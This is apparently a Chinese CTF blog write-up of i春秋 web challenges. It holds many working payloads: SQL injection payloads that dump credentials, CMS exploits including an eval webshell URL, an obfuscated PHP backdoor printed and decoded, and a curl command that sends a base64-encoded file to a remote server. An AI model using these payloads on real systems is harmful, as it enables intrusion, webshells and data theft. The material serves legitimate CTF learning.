self.render(\u0026#34;lock.html\u0026#34;) def post(self): username = self.get_secure_cookie(\u0026#34;username\u0026#34;) or \u0026#39;\u0026#39; passwd = md5(self.get_argument(\u0026#39;password\u0026#39;,\u0026#39;\u0026#39;)) row = db.ct(\u0026#34;manager\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;username=\u0026#39;\u0026#34;+ username +\u0026#34;\u0026#39;and password=\u0026#39;\u0026#34;+ passwd +\u0026#34;\u0026#39;\u0026#34;) if row: self.set_secure_cookie(\u0026#34;lock\u0026#34;, \u0026#34;0\u0026#34;) self.redirect(\u0026#34;http://\u0026#34; + URL) else: self.redirect(\u0026#34;http://\u0026#34; + URL + \u0026#34;/lock\u0026#34;) 而 set_secure_cookie 方法来自 tornado，该方法使用一个 cookie_secret 来加密 cookie。我们可以在 index.py 中发现这个 cookie_secret：\nsettings = { \u0026#34;static_path\u0026#34;: os.path.join(os.path.dirname(__file__), \u0026#34;themes/static\u0026#34;), \u0026#34;template_path\u0026#34;: os.path.join(os.path.dirname(__file__), \u0026#34;themes\u0026#34;), \u0026#34;cookie_secret\u0026#34;: \u0026#34;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=\u0026#34;, \u0026#34;login_url\u0026#34;: \u0026#34;/login\u0026#34;, } 所以，我们在注入的时候，只需要将 payload 用 cookie_secret 加密即可。借助 tornado 写个脚本：\nimport tornado.web import tornado.ioloop settings = { \u0026#39;cookie_secret\u0026#39;: \u0026#39;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=\u0026#39; } class MainHandler(tornado.web.RequestHandler): def get(self): self.write(\u0026#39;aaa\u0026#39;) # self.set_secure_cookie(\u0026#39;username\u0026#39;, \u0026#34;\u0026#39; and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#\u0026#34;) # self.set_secure_cookie(\u0026#39;username\u0026#39;, \u0026#34;\u0026#39; and updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;manager\u0026#39;),0x7e),1)#\u0026#34;) # self.set_secure_cookie(\u0026#39;username\u0026#39;, \u0026#34;\u0026#39; and updatexml(1,concat(0x7e, (select group_concat(username,\u0026#39;||\u0026#39;,password,\u0026#39;||\u0026#39;,email) from manager),0x7e),1)#\u0026#34;) self.set_secure_cookie(\u0026#39;username\u0026#39;, \u0026#34;\u0026#39; and updatexml(1,concat(0x7e, mid((select group_concat(username,\u0026#39;||\u0026#39;,password,\u0026#39;||\u0026#39;,email) from manager),30,40),0x7e),1)#\u0026#34;) self.write(self.get_secure_cookie(\u0026#39;username\u0026#39;)) def makeapp(): return tornado.web.Application([ (r\u0026#39;/index\u0026#39;, MainHandler), ], **settings) app = makeapp() app.listen(8089) tornado.ioloop.IOLoop.instance().start() 浏览器访问本机 8089 端口，在返回头 Set-Cookie 中得到加密后的注入语句，带着这个 cookie 访问网页的 /lock（而不是 /login）。在爆用户名、密码和邮箱时，显示长度有限制，因此需要分两次用 mid 截取，最终得到用户名、密码和邮箱为：\nichuqiu||318a61264482e503090facfc4337207f||545 密码经过 MD5 解密得到：Myxss623。登录在后台发现 f13g_ls_here.txt 文件，继续通过注入读取该文件。将代码中 set_secure_cookie 的第二个参数改为：\n\u0026#34;\u0026#39; and updatexml(1,concat(0x7e, (select load_file(\u0026#39;/var/www/html/fl3g_ls_here.txt\u0026#39;)),0x7e),1)#\u0026#34; 然后故技重施，由于长度限制只得到一部分 flag，再修改 payload：\n\u0026#34;\u0026#39; and updatexml(1,concat(0x7e, mid((select load_file(\u0026#39;/var/www/html/f13g_ls_here.txt\u0026#39;)),30,40),0x7e),1)#\u0026#34; 即可得到第二部分。\n再见 CMS # 根据登录页面页脚可以判断出该 CMS 为齐博 CMS。漏洞参考，很巧妙地利用了转义进行 SQL 注入。\n根据参考的文章，先注册一个用户，然后去会员中心修改个人信息，可以看到表单中每一项对应什么参数。然后构造 payload：\n/member/userinfo.php?job=edit\u0026amp;step=2 POST 数据：\ntruename=xxxx%0000\u0026amp;Limitword[000]=\u0026amp;email=123456@qq.com\u0026amp;provinceid=,address=(select database()) where uid=3# 首先 uid 对应自己账户的 uid，在个人信息处可以在 url 中看到。注入的具体原理参考 “漏洞参考” 文章，注入点是参数 provinceid，注意不是 address。\n这样可以在个人信息页面的 “联系地址” 一栏得到数据库名 blog。接下来爆表名：\ntruename=xxxx%0000\u0026amp;Limitword[000]=\u0026amp;email=123456@qq.com\u0026amp;provinceid=,address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid=3# 我们关心的是表 admin。爆列名，注意单双引号会被转义所以不能使用，可以用十六进制绕过：\ntruename=xxxx%0000\u0026amp;Limitword[000]=\u0026amp;email=123456@qq.com\u0026amp;provinceid=,address=(select group_concat(column_name) from information_schema.columns where table_name=0x61646d696e) where uid=3# 爆用户名和密码：\ntruename=xxxx%0000\u0026amp;Limitword[000]=\u0026amp;email=123456@qq.com\u0026amp;provinceid=,address=(select group_concat(username,0x7e,password) from admin) where uid=3# 得到用户名 admin，密码 MD5 2638127c92b79ee7901195382dc08068，普通 MD5 网站解不出来，在 https://hashkiller.co.uk/Cracker 和 http://www.chamd5.org/ 上破解出来是 4b10b488e4c8，但是用这个密码登录不了，可能方向错了吧。\n无奈只能扫下目录发现 flag.php，然后利用 SQL 读文件：\ntruename=xxxx%0000\u0026amp;Limitword[000]=\u0026amp;email=123456@qq.com\u0026amp;provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3# 发现联系地址这次变成了空白，F12 得到 flag.php 源码从而得到 flag。\nSQL # 过滤了很多关键字，绕过技巧是用 \u0026lt;\u0026gt; 来分割：\nid=1 o\u0026lt;\u0026gt;rder by 1 发现 by 4 的时候无回显但 by 3 的时候有，说明共 3 列。\nid=1 union se\u0026lt;\u0026gt;lect 1,2,3 得到回显 2。接下来正常注入：\nid=1 union se\u0026lt;\u0026gt;lect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- info, users id=1 union se\u0026lt;\u0026gt;lect 1,group_concat(column_name),3 from information_schema.columns where table_name=\u0026#39;info\u0026#39; -- id,title,flAg_T5ZNdrm id=1 union se\u0026lt;\u0026gt;lect 1,flAg_T5ZNdrm,3 from info -- flag{...} SQLi # F12 发现 login.php?id=1，但是这里好像注入不了。\n回到前页，发现页面是由 index.php 302 跳转来的，因此检查一下对于 index.php 的请求的返回头，发现了特殊字段 page，得到真正的登陆页面 l0gin.php?id=1。\n这个 id 可以注入，但是存在逗号截断，因此需要在没有逗号的情况下注入，这里很容易想到 join。先 order by 注入，得到列数为 2。\nid=1\u0026#39; order by 3%23 尝试一下 join:\nid=1\u0026#39;union select * from (select 1)a join (select 2)b%23 发现还是正常返回 1,flag，因为网页上限制了只能显示一条记录，而 id=1 的查询是成功的，因此后面我们 union 的结果没有回显出来。因此只需要让 id=3 使得查询不到 username 即可。\n最后正常注入：\nid=3\u0026#39;union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b%23 id=3\u0026#39;union select * from (select 1)a join (select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39;)b%23 id=3\u0026#39;union select * from (select 1)a join (select flag_9c861b688330 from users)b%23 123 # F12 得到 user.php 和用户默认密码，下载 user.php.bak，打开得到一堆用户名。Intruder 用 BatteringRam 模式爆破用户名密码，登陆后 F12 得到：\n\u0026lt;!-- 存在漏洞需要去掉 --\u0026gt; \u0026lt;!-- \u0026lt;form action=\u0026#34;\u0026#34;method=\u0026#34;POST\u0026#34;enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34;name=\u0026#34;file\u0026#34;/\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;name=\u0026#34;submit\u0026#34;value=\u0026#34; 上传 \u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; --\u0026gt; 这里猜测是文件上传漏洞。恢复前端代码后随便选个文件上传，发现只能传图片文件，因此修改 Content-Type 和文件内容。Content-Type 设置为 image/png，文件内容中写入 PNG 文件头 PNG。然后将文件名改为 1.png.php，但是提示 文件名不能包含 php。\n因此尝试 1.png.pht 绕过，得到页面 view.php。只有一个提示 file?，尝试传入 GET 参数 file=flag，得到提示 filter 'flag'，于是双写绕过。\nTest # 海洋 CMS 很老的漏洞，漏洞详情。\n直接蚁剑连接 /search.php?searchtype=5\u0026amp;tid=\u0026amp;area=eval($_POST[1]) 来 getshell。但是没有找到 flag。\n到 /var/www/html/data/common.inc.php 找到数据库配置：\n\u0026lt;?php // 数据库连接信息 $cfg_dbhost = \u0026#39;127.0.0.1\u0026#39;; $cfg_dbname = \u0026#39;seacms\u0026#39;; $cfg_dbuser = \u0026#39;sea_user\u0026#39;; $cfg_dbpwd = \u0026#39;46e06533407e\u0026#39;; $cfg_dbprefix = \u0026#39;sea_\u0026#39;; $cfg_db_language = \u0026#39;utf8\u0026#39;; ?\u0026gt; 在蚁剑中选择 数据操作，然后输入上面的配置信息，可以在 seacms 数据库的 flag_140ad2e0d8cb 表中执行 SQL 语句得到 flag。\nLogin # F12 中提示账户密码都为 test1，登录后在响应头中发现 show 字段，把 0 在请求头改成 1 试试，发现注释中返回了源码。\n\u0026lt;?php include \u0026#39;common.php\u0026#39;; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); class db { public $where; function __wakeup() { if(!empty($this-\u0026gt;where)) { $this-\u0026gt;select($this-\u0026gt;where); } } function select($where) { $sql = mysql_query(\u0026#39;select * from user where\u0026#39;.$where); return @mysql_fetch_array($sql); } } if(isset($requset[\u0026#39;token\u0026#39;])) { $login = unserialize(gzuncompress(base64_decode($requset[\u0026#39;token\u0026#39;]))); $db = new db(); $row = $db-\u0026gt;select(\u0026#39;user=\\\u0026#39;\u0026#39;.mysql_real_escape_string($login[\u0026#39;user\u0026#39;]).\u0026#39;\\\u0026#39;\u0026#39;); if($login[\u0026#39;user\u0026#39;] ===\u0026#39;ichunqiu\u0026#39;) { echo $flag; }else if($row[\u0026#39;pass\u0026#39;] !== $login[\u0026#39;pass\u0026#39;]){ echo \u0026#39;unserialize injection!!\u0026#39;; }else{ echo \u0026#34;(╯‵□′)╯︵┴─┴ \u0026#34;; } }else{ header(\u0026#39;Location: index.php?error=1\u0026#39;); } ?\u0026gt; 这里需要以 ichunqiu 登录，关键就在于那个反序列化的过程。而且，array_merge 合并时，遇到相同的键取最后的那个值。\n写个脚本生成需要的 token，然后放在 cookie 里发送就好了。\n\u0026lt;?php $a = array(\u0026#39;user\u0026#39; =\u0026gt; \u0026#39;ichunqiu\u0026#39;); echo base64_encode(gzcompress(serialize($a))); ?\u0026gt; Backdoor # 扫目录发现 .git 泄露。上 GitHack 把 .git 下载下来，然后发现需要回退。\n值得记录的是 GitHack 好像没能把 .git 下下来，只能下载所有文件，因此我使用了 dvcs ripper 这个工具：\n./rip-git.pl -v -u http://1355bb65468a451b9487c15dba117690cff7627b879e42f2. changame.ichunqiu.com/Challenges/.git/ 访问 /Challenges/.git/logs/HEAD 可以查看提交记录，或者也可以 git log 查看。随后回退到之前的版本：\ngit reset --hard 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88 cat flag.php 这时可以看到，flag.php 内容变为：\n\u0026lt;?php echo \u0026#34;flag{true_flag_is_in_the_b4ckdo0r.php}\u0026#34;; ?\u0026gt; 那么我们继续访问 b4ckdo0r.php，提示要找出其源码。这种一般都存在备份文件里，例如 vim 中的 .swo 和 .swp，逐一尝试得备份文件 .b4ckdo0r.php.swp，用 vim -r 恢复：\n\u0026lt;?php echo \u0026#34;can you find the source code of me?\u0026#34;; /** * Signature For Report */$h=\u0026#39;_)m/\u0026#34;,\u0026#34;/-/)m\u0026#34;),)marray()m\u0026#34;/\u0026#34;,\u0026#34;+\u0026#34;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)\u0026#39;;/* */$H=\u0026#39;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(\u0026#34;\u0026lt;)m$k\u0026gt;$d\u0026lt;)m/)m$k\u0026gt;)m\u0026#34;);@sessio)mn_d)mestroy();}}}}\u0026#39;;/* */$N=\u0026#39;mR;$rr)m=@$r[)m\u0026#34;HTT)mP_RE)mFERER\u0026#34;];$ra)m=)m@$r[\u0026#34;HTTP_AC)mC)mEPT_LANG)mUAGE)m\u0026#34;)m];if($rr)m\u0026amp;\u0026amp;$ra){)m$u=parse_u)mrl($rr);p\u0026#39;;/* */$u=\u0026#39;$e){)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(\u0026#34;/\u0026#39;;/* */$f=\u0026#39;$i\u0026lt;$)ml;)m){)mfo)mr($j)m=0;($j\u0026lt;$c\u0026amp;\u0026amp;$i\u0026lt;$l);$j)m++,$i+)m+){$)mo.=$t{$i)m}^$)mk{$j};}}r)meturn )m$o;}$r)m=$_SERVE)\u0026#39;;/* */$O=\u0026#39;[$i]=\u0026#34;\u0026#34;;$p)m=$)m)mss($p,3)m);}if(ar)mray_)mkey_exists)m()m$i,$s)){$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(\u0026#39;;/* */$w=\u0026#39;)m));)m$p=\u0026#34;\u0026#34;;fo)mr($z=1;)m$z\u0026lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0){$s)m\u0026#39;;/* */$P=\u0026#39;trt)molower\u0026#34;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=strtolower()msubstr(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml(substr()m)mmd5($i.$kf),0,3\u0026#39;;/* */$i=\u0026#39;)marse_)mstr)m($u[\u0026#34;q)muery\u0026#34;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m\u0026#34;/([\\\\w)m])m)[\\\\w-)m]+(?:;q=0.)\u0026#39;;/* */$x=\u0026#39;m([\\\\d)m]))?,?/\u0026#34;,)m$ra,$m))m;if($q)m\u0026amp;\u0026amp;$)mm))m)m{@session_start();$)ms=\u0026amp;$_S)mESSI)m)mON;$)mss=\u0026#34;sub)mstr\u0026#34;;strtolower=\u0026#34;s)m\u0026#39;;/* */$y=str_replace(\u0026#39;b\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;crbebbabte_funcbbtion\u0026#39;);/* */$c=\u0026#39;$kh=\u0026#34;4f7)m)mf\u0026#34;;$kf=\u0026#34;2)m)m8d7\u0026#34;;funct)mion x($t)m,$k){$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=\u0026#34;\u0026#34;;for()m$i=0;\u0026#39;;/* */$L=str_replace(\u0026#39;)m\u0026#39;,\u0026#39;\u0026#39;,$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/* */$v=$y(\u0026#39;\u0026#39;,$L);$v();/* */ ?\u0026gt; 这里的代码经过了混淆，我们在代码末尾加上一段代码来进行分析：\necho var_dump($L); echo $y; echo $v; 得到原本的核心代码 ($L)：\n\u0026lt;?php $kh=\u0026#34;4f7f\u0026#34;; $kf=\u0026#34;28d7\u0026#34;; function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=\u0026#34;\u0026#34;; for($i=0; $i\u0026lt;$l;) { for($j=0; ($j\u0026lt;$c\u0026amp;\u0026amp;$i\u0026lt;$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; }$r=$_SERVER; $rr=@$r[\u0026#34;HTTP_REFERER\u0026#34;]; $ra=@$r[\u0026#34;HTTP_ACCEPT_LANGUAGE\u0026#34;]; if($rr\u0026amp;\u0026amp;$ra) { $u=parse_url($rr); parse_str($u[\u0026#34;query\u0026#34;],$q); $q=array_values($q); preg_match_all(\u0026#34;/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\u0026#34;,$ra,$m); if($q\u0026amp;\u0026amp;$m) { @session_start(); $s=\u0026amp;$_SESSION; $i=$m[1][0].$m[1][1]; $h=strtolower(substr(md5($i.$kh),0,3)); $f=strtolower(substr(md5($i.$kf),0,3)); $p=\u0026#34;\u0026#34;; for($z=1; $z\u0026lt;count($m[1]); $z++)$p.=$q[$m[2][$z]]; if(strpos($p,$h)===0) { $s[$i]=\u0026#34;\u0026#34;; $p=substr($p,3); } if(array_key_exists($i,$s)) { $s[$i].=$p; $e=strpos($s[$i],$f); if($e) { $k=$kh.$kf; ob_start(); //！ @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\u0026#34;/_/\u0026#34;,\u0026#34;/-/\u0026#34;),array(\u0026#34;/\u0026#34;,\u0026#34;+\u0026#34;),substr($s[$i],0,$e))),$k))); $o=ob_get_contents(); ob_end_clean(); $d=base64_encode(x(gzcompress($o),$k)); print(\u0026#34;\u0026lt;$k\u0026gt;$d\u0026lt;/$k\u0026gt;\u0026#34;); @session_destroy(); } } } } 代码的重点在于 Accept-Language，Referer 和感叹号所在的行，因为可以用 eval 执行代码。\n首先 x 函数显然是循环异或。随后仔细阅读 preg_match_all 的正则表达式，发现它将 Accept-Language 分成了 3 部分，m[0] 存每种语言的完整字符串，m[1] 存首字母，m[2] 存语言权重小数点后的数字。\nAccept-Language 格式：语言;q=权重，例如 en-US;q=0.5\n而 $i 取的是 $m[1][0].$m[1][1]，也就是前两种语言的首字母。$h 和 $f 不难计算，我们假设输入的语言是 zh-CN,zh，那么 $i 就是 zz，计算得到 $h 为 675，$f 为 a3e。\n不过下面的 for 循环有点绕：\nfor($z=1; $z\u0026lt;count($m[1]); $z++) $p.=$q[$m[2][$z]]; $z 指当前是第几种语言，$m[2][$z] 就是该语言权重的小数点后第一位，以这个值为索引取得 Referer 的 url 中 query string 里对应索引的那个参数值拼接到 $p 上。\n下面的 if 判断 $p 是不是以 $h 开头 $f 结尾，如果是则进入下面的 eval 函数，我们才能实现命令注入。eval 函数内是一个简单的写逆向函数的过程。\n脚本：\n\u0026lt;?php // 照搬 function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=\u0026#34;\u0026#34;; for($i=0; $i\u0026lt;$l;) { for($j=0; ($j\u0026lt;$c\u0026amp;\u0026amp;$i\u0026lt;$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; } function inject($cmd) { $payload = base64_encode(x(gzcompress($cmd), \u0026#34;4f7f28d7\u0026#34;)); return \u0026#34;675\u0026#34;.$payload.\u0026#34;a3e\u0026#34;; } echo inject(\u0026#39;system(\u0026#34;ls\u0026#34;);\u0026#39;); ?\u0026gt; 将得到的字符串放在 Referer 的第一个参数里，设置请求头：\nAccept-Language: zh-CN,zh;q=0.0 Referer: http://12.12.12.12/index.php?a=675TPocyB4WLfrhNv1PZOrQMTREimJna3e 得到经过编码的返回值：\nTPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT 再写脚本解码：\n\u0026lt;?php // 照搬 function x($t,$k) { $c=strlen($k); $l=strlen($t); $o=\u0026#34;\u0026#34;; for($i=0; $i\u0026lt;$l;) { for($j=0; ($j\u0026lt;$c\u0026amp;\u0026amp;$i\u0026lt;$l); $j++,$i++) { $o.=$t{$i}^$k{$j}; } } return $o; } function dec($out) { return gzuncompress(x(base64_decode($out), \u0026#39;4f7f28d7\u0026#39;)); } echo dec(\u0026#39;TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT\u0026#39;); ?\u0026gt; 得到解码后的返回值：\nb4ckdo0r.php flag.php index.php robots.txt this_i5_flag.php 然后执行命令 cat this_i5_flag.php，和上面一样的方法编码后发送得到编码后的 flag，再用同样方法解码即可。最后 flag 在页面注释中。\nGetFlag # 熟悉的爆破 md5 套路：\nimport hashlib, sys for i in range(10**5, 10**8): val = hashlib.md5(str(i)).hexdigest() if val[:6] == sys.argv[1]: print(i) break 用户名可以直接注入，密码任意。登录后可以看到三个文件。提示说 flag 在 web 根目录。注意到文件的下载 url 为：\n/Challenges/file/download.php?f=a.php 可以尝试下载 flag.php，但是显示 flag{wow!!!but not true}。猜想这里可能不能使用相对路径，换成绝对路径：\n/Challenges/file/download.php?f=/var/www/html/Challenges/flag.php 得到源码：\n\u0026lt;?php $f = $_POST[\u0026#39;flag\u0026#39;]; $f = str_replace(array(\u0026#39;`\u0026#39;,\u0026#39;$\u0026#39;,\u0026#39;*\u0026#39;,\u0026#39;#\u0026#39;,\u0026#39;:\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\u0026#34;\u0026#39;,\u0026#34;\u0026#39;\u0026#34;,\u0026#39;(\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;\u0026gt;\u0026#39;),\u0026#39;\u0026#39;, $f); if((strlen($f) \u0026gt; 13) || (false !== stripos($f,\u0026#39;return\u0026#39;))) { die(\u0026#39;wowwwwwwwwwwwwwwwwwwwwwwwww\u0026#39;); } try { eval(\u0026#34;\\$spaceone = $f\u0026#34;); } catch (Exception $e) { return false; } if ($spaceone ===\u0026#39;flag\u0026#39;){ echo file_get_contents(\u0026#34;helloctf.php\u0026#34;); } ?\u0026gt; 。。。看似过滤一大堆，实际上直接 POST 提交 flag=flag; 就完了，需要注意的就是最后的分号。\nNot Found # 首页直接跳转到不存在的 404.php，在响应头中发现 X-Method: haha 字段。一次尝试 HTTP 方法，当使用 OPTIONS 时，发现响应头中多出了 Location: ?f=1.php 字段。对这个 url 也进行 OPTIONS 请求，得到一段源码：\n\u0026lt;?php $msg = \u0026#34;not here\u0026#34;; $msg .= PHP_EOL; $msg .=\u0026#34;plz trying\u0026#34;; echo $msg; 直接访问 1.php 发现这就是 1.php 的源码。猜测这个 f 参数的功能就是文件读取，尝试 index.php 发现不允许。最后发现 .htaccess 却可以读：\nRewriteEngine On RewriteBase / RewriteRule ^8d829d8568e46455104209db5cd9228d.html$ 404.php [L] 因此我们访问这个 html 得到提示，修改 XFF 头，但是无效。因此我们换而修改 client-ip 头为 127.0.0.1 得到 flag。\nVld # F12 得到提示 index.php.txt，访问得到了一个看不太懂的文件，似乎是 php 的 opcode。耐心分析还是不难理解的，需要三个 GET 参数 flag1, flag2, flag3，分别等于 fvhjjihfcv, gfuyiyhioyf, yugoiiyhi。访问新 url 可以下载到源码。\n观察源码发现关键的地方在于：\n/* dbmysql.class.php */ public function my_md5($string){ return md5(substr(md5($string),5,24)); } public function safe_data($value){ if(MAGIC_QUOTES_GPC){ stripcslashes($value); } return addslashes($value); } /* login.php */ $username = $db-\u0026gt;safe_data($_POST[\u0026#39;username\u0026#39;]); $password = $db-\u0026gt;my_md5($_POST[\u0026#39;password\u0026#39;]); $number = is_numeric($_POST[\u0026#39;number\u0026#39;]) ? $_POST[\u0026#39;number\u0026#39;] : 1; $username = trim(str_replace($number,\u0026#39;\u0026#39;, $username)); $sql = \u0026#34;select * from\u0026#34;.\u0026#34;`\u0026#34;.table_name.\u0026#34;`\u0026#34;.\u0026#34;where username=\u0026#34;.\u0026#34;\u0026#39;\u0026#34;.\u0026#34;$username\u0026#34;.\u0026#34;\u0026#39;\u0026#34;; 这里可以看到 username 会先被 addslashes，然后其中和 number 相同的部分会被去掉。这样我们就能让 ' 逃过转义，当我们提交 username=%00' 时，会被 addslashes 转义为 \\0\\'，如果 number=0，则其中的 0 会被替换掉变成 \\\\'，此时第二个 \\ 被转义，原 SQL 语句变为 where username='\\\\'，成功闭合。\n然后就是报错注入，注意语句中不能再出现 0 了：\nnumber=0\u0026amp;username=%00\u0026#39;or updatexml(1,concat(hex(126),(select group_concat(table_name) from information_schema.tables where table_schema=database()),hex(126)),1)#\u0026amp;password=ccc\u0026amp;submit= number=0\u0026amp;username=%00\u0026#39;or updatexml(1,concat(hex(126),(select flag from flag),hex(126)),1)#\u0026amp;password=ccc\u0026amp;submit= number=0\u0026amp;username=%00\u0026#39;or updatexml(1,concat(hex(126),substr((select flag from flag),21,99),hex(126)),1)#\u0026amp;password=ccc\u0026amp;submit= EXEC # F12 在 html 的 head 标签中发现 editor=\u0026quot;vim\u0026quot;，显然能下载 .index.php.swp：\n\u0026lt;?php /* flag in flag233.php */ function check($number) { $one = ord(\u0026#39;1\u0026#39;); $nine = ord(\u0026#39;9\u0026#39;); for ($i = 0; $i \u0026lt; strlen($number); $i++) { $digit = ord($number{$i}); if (($digit\u0026gt;= $one) \u0026amp;\u0026amp; ($digit \u0026lt;= $nine) ) { return false; } } return $number == \u0026#39;11259375\u0026#39;; } if(isset($_GET[sign])\u0026amp;\u0026amp; check($_GET[sign])){ setcookie(\u0026#39;auth\u0026#39;,\u0026#39;tcp tunnel is forbidden!\u0026#39;); if(isset($_POST[\u0026#39;cmd\u0026#39;])){ $command=$_POST[cmd]; $result=exec($command); //echo $result; } }else{ die(\u0026#39;no sign\u0026#39;); } ?\u0026gt; 首先需要一个 GET 参数，其值为 11259375 但不能包含 1-9 中的数字。注意到这里的弱比较，可以将该数字转为十六进制，恰好为 0xabcdef，不包含 1-9，因此提交 ?sign=0xabcdef 可以发现 no sign 的提示没有了。\n接下来在保留刚才的参数的同时 POST 命令就可以执行了，但是没有回显，猜想是通过 nc 把 flag233.php 反弹到自己的服务器上，并且需要走 UDP，但是最终没有成功。最终采用了 curl 的方法，把文件内容 base64 编码后放在 url 里向服务器发送请求，并在日志中查看 flag。payload：\ncmd=data=$(cat flag233.php | base64);curl http://xx.xx.xx.xx?data=$data; 在 access.log 中即可得到编码后的 flag233.php。\n","date":"2019-08-24","permalink":"/posts/icq-web/","section":"Posts","summary":"\u003cp\u003ei 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。\u003c/p\u003e","title":"i 春秋 Web 练习记录"},{"content":"实验吧的 Web 题总体比 Bugku 难一些，主要难度在于几道注入题。\n简单的登录题 # 非常不友好的第一题。。\n随便输入 id 发送并抓包，在请求包中的 cookie 中发现 iv 和 cipher，可以确定是对称密码题。。响应头中有个提示 test.php，访问得到一大段代码：\ndefine(\u0026#34;SECRET_KEY\u0026#34;, \u0026#39;***********\u0026#39;); define(\u0026#34;METHOD\u0026#34;, \u0026#34;aes-128-cbc\u0026#34;); error_reporting(0); include(\u0026#39;conn.php\u0026#39;); function sqliCheck($str){ if(preg_match(\u0026#34;/\\\\\\|,|-|#|=|~|union|like|procedure/i\u0026#34;,$str)){ return 1; } return 0; } function get_random_iv(){ $random_iv=\u0026#39;\u0026#39;; for($i=0;$i\u0026lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv; } function login($info){ $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); setcookie(\u0026#34;iv\u0026#34;, base64_encode($iv)); setcookie(\u0026#34;cipher\u0026#34;, base64_encode($cipher)); } function show_homepage(){ global $link; if(isset($_COOKIE[\u0026#39;cipher\u0026#39;]) \u0026amp;\u0026amp; isset($_COOKIE[\u0026#39;iv\u0026#39;])){ $cipher = base64_decode($_COOKIE[\u0026#39;cipher\u0026#39;]); $iv = base64_decode($_COOKIE[\u0026#34;iv\u0026#34;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){ $info = unserialize($plain) or die(\u0026#34;\u0026lt;p\u0026gt;base64_decode(\u0026#39;\u0026#34;.base64_encode($plain).\u0026#34;\u0026#39;) can\u0026#39;t unserialize\u0026lt;/p\u0026gt;\u0026#34;); $sql=\u0026#34;select * from users limit\u0026#34;.$info[\u0026#39;id\u0026#39;].\u0026#34;,0\u0026#34;; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)\u0026gt;0 or die(mysqli_error($link))){ $rows=mysqli_fetch_array($result); echo \u0026#39;\u0026lt;h1\u0026gt;\u0026lt;center\u0026gt;Hello!\u0026#39;.$rows[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/center\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;; } else{ echo \u0026#39;\u0026lt;h1\u0026gt;\u0026lt;center\u0026gt;Hello!\u0026lt;/center\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;; } }else{ die(\u0026#34;ERROR!\u0026#34;); } } } if(isset($_POST[\u0026#39;id\u0026#39;])){ $id = (string)$_POST[\u0026#39;id\u0026#39;]; if(sqliCheck($id)) die(\u0026#34;\u0026lt;h1 style=\u0026#39;color:red\u0026#39;\u0026gt;\u0026lt;center\u0026gt;sql inject detected!\u0026lt;/center\u0026gt;\u0026lt;/h1\u0026gt;\u0026#34;); $info = array(\u0026#39;id\u0026#39;=\u0026gt;$id); login($info); echo \u0026#39;\u0026lt;h1\u0026gt;\u0026lt;center\u0026gt;Hello!\u0026lt;/center\u0026gt;\u0026lt;/h1\u0026gt;\u0026#39;; }else{ if(isset($_COOKIE[\u0026#34;iv\u0026#34;])\u0026amp;\u0026amp;isset($_COOKIE[\u0026#39;cipher\u0026#39;])){ show_homepage(); }else{ echo \u0026#39;\u0026lt;body class=\u0026#34;login-body\u0026#34;style=\u0026#34;margin:0 auto\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;wrapper\u0026#34;style=\u0026#34;margin:0 auto;width:800px;\u0026#34;\u0026gt; \u0026lt;form name=\u0026#34;login-form\u0026#34;class=\u0026#34;login-form\u0026#34;action=\u0026#34;\u0026#34;method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Login 